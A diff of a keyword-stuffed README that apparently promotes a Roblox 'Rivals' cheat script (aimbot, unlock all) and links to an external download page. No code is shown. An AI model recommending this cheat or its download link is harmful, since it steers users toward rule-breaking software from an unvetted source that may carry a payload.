@@ -6,7 +6,7 @@
 
 Welcome to the repository for customizing and optimizing your performance in the highly competitive game arena of Rivals. This guide provides a detailed breakdown of features, setup instructions, and configuration options. If you are aiming to customize your client experience with the **soluna rivals script** setup, you can access all modules easily. Our development matches standards commonly found on platforms such as **rivals scriptblox** to deliver a lightweight and highly efficient implementation.
 
-[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-red)](https://roblrivals.github.io/rivals/)
+[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals_Script-red?style=for-the-badge)](https://roblrivals.github.io/rivals/)
 
 <img width="1280" height="720" alt="Rivals Script - Unlock All, RageBot, AIMBOT (NO KEY)" src="https://github.com/user-attachments/assets/9dd1d494-4bc3-4cd2-8884-dedb18a26215" />
 
